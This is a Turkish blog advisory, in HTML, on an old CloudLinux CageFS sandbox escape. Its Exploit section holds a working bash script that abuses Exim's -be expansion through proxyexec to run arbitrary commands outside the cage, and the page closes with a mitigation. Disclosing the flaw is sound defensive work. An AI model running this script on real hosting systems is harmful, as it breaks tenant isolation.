<!DOCTYPE html>
<html lang="en-gb" dir="ltr">
<head>
	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
	<meta charset="utf-8" />
	<title>Exim yolu ile CloudLinux CageFS bypass </title>
	<link href="https://zer0fy.github.io/css/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon" />
	<link href="https://zer0fy.github.io/css/prism-twilight.css" rel="stylesheet" />
	<link href="https://zer0fy.github.io/css/prism-linenumbers.css" rel="stylesheet" />
	<link href="https://zer0fy.github.io/css/template.css?1d384379fc6b3f78caa5fd806121ae21" rel="stylesheet" />
	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet" />
	<style>

	h1, h2, h3, h4, h5, h6, .site-title {
		font-family: 'Open Sans', sans-serif;
	}
	body.site {
		border-top: 3px solid #f00000;
		background-color: #000000;
	}
	a {
		color: #f00000;
	}
	.nav-list > .active > a,
	.nav-list > .active > a:hover,
	.dropdown-menu li > a:hover,
	.dropdown-menu .active > a,
	.dropdown-menu .active > a:hover,
	.nav-pills > .active > a,
	.nav-pills > .active > a:hover,
	.btn-primary {
		background: #f00000;
	}
	</style>
	<script src="https://zer0fy.github.io/css/prism-tinymce.js"></script>
	<script src="https://zer0fy.github.io/css/jquery.min.js?1d384379fc6b3f78caa5fd806121ae21"></script>
	<script src="https://zer0fy.github.io/css/jquery-noconflict.js?1d384379fc6b3f78caa5fd806121ae21"></script>
	<script src="https://zer0fy.github.io/css/jquery-migrate.min.js?1d384379fc6b3f78caa5fd806121ae21"></script>
	<script src="https://zer0fy.github.io/css/caption.js?1d384379fc6b3f78caa5fd806121ae21"></script>
	<script src="https://zer0fy.github.io/css/bootstrap.min.js?1d384379fc6b3f78caa5fd806121ae21"></script>
	<script src="https://zer0fy.github.io/css/template.js?1d384379fc6b3f78caa5fd806121ae21"></script>
	<!--[if lt IE 9]><script src="/media/jui/js/html5.js?1d384379fc6b3f78caa5fd806121ae21"></script><![endif]-->
	<script>
jQuery(window).on('load',  function() {
				new JCaption('img.caption');
			});
	</script>

</head>
<body class="site com_content view-article no-layout no-task itemid-102">
	<!-- Body -->
	<div class="body" id="top">
		<div class="container">
			<!-- Header -->
			<header class="header" role="banner">
				<div class="header-inner clearfix">
					<a class="brand pull-left" href="/">
						<span class="site-title" title="su">Sudo su</span>											</a>
					<div class="header-search pull-right">
						
					</div>
				</div>
			</header>
						
			<div class="row-fluid">
								<main id="content" role="main" class="span12">
					<!-- Begin Content -->
							<div class="moduletable_menu">
						<ul class="nav menu nav-pills mod-list">
<li class="item-102 default current active"><a href="/" >Blog Titles</a></li><li class="item-103"><a href="/contact.html" >Contact</a></li></ul>
		</div>
	
					<div id="system-message-container">
	</div>

					

<div class="item-page" itemscope itemtype="https://schema.org/Article">
	<meta itemprop="inLanguage" content="en-GB" />
	
		
			<div class="page-header">
		<h2 itemprop="headline">
			Exim Kullanarak CloudLinux CageFS bypass		</h2>
							</div>
					
		
						<dl class="article-info muted">

		
			<dt class="article-info-term">
									Details							</dt>

			
			
			
			
			
		
												<dd class="create">
					<span class="icon-calendar" aria-hidden="true"></span>
					<time datetime="2019-11-29T21:20:30+01:00" itemprop="dateCreated">
						Created: 21 Feb. 2020					</time>
			</dd>			
										<dd class="modified">
				<span class="icon-calendar" aria-hidden="true"></span>
				<time datetime="2019-12-01T17:56:28+01:00" itemprop="dateModified">
					Last Updated: 21 Feb. 2020			</time>
			</dd>			
						</dl>
	
	
		
								<div itemprop="articleBody">
		<h2>Vulnerability</h2>
<p><strong>Etkilenen Yazılımlar:</strong> CloudLinux CageFS (Eski bir açık olduğu için versiyon bilgisi veremiyorum)</p>
<p>CloudLinux CageFS, genleşme testi modunda exim çalıştırılarak atlanabilir.</p>
<p>(<code>-be</code>) Yanda belirtilen şekildeki dize genişletmesi ile : <code>${run{&lt;command&gt; &lt;args&gt;}{&lt;string1&gt;}{&lt;string2&gt;}}</code> Exim <code>-be</code> argümanları proxyexec tarafından filtrelenmez ve CageFS içindeki kullanıcı CageFS dışındaymış gibi komut çalıştırabilir..</p>
<h2>Exploit</h2>
<pre class="language-c"><code>#!/bin/bash

if [[ $# -eq 0 ]]
then
    echo "Usage: $0 &lt;command&gt; [arg]..."
    exit 1
fi

OUTPUT_FILE=$(mktemp -p "${HOME}")

echo "\${run{/bin/bash -c \"$@ &gt;${OUTPUT_FILE}\"}{foo}{bar}}" | /usr/sbin/proxyexec -c cagefs.sock "$USER" "$(cat /var/.cagefs/.cagefs.token)" "$(pwd)" EXIM -be
cat "${OUTPUT_FILE}"
rm "${OUTPUT_FILE}"
</code></pre>
<h2>ÇÖzüm : </h2>
<p>CageFS yeni sürümüne güncellenmeli <code>-be</code> ve <code>-bem</code> parametreleri şu dosyalardan filtrelenmelidir :  <code>/etc/cagefs/filters/exim.json</code> , <code>/etc/cagefs/filters/sendmail.json</code>.</p>
<h2>Timeline</h2>
<p>(2016 civarında eski güvenlik açığı , Clou Linux Eski sürümlerinde çalışmaktadır)</p> 	</div>

	
							</div>

					<div class="clearfix"></div>
					
					<!-- End Content -->
				</main>
							</div>
		</div>
	</div>
	<!-- Footer -->
	<footer class="footer" role="contentinfo">
		<div class="container">
			<hr />
			
			<p class="pull-right">
				<a href="#top" id="back-top">
					Back to Top				</a>
			</p>
			<p>
				&copy; 2020 sudo-su			</p>
		</div>
	</footer>
	
</body>
</html>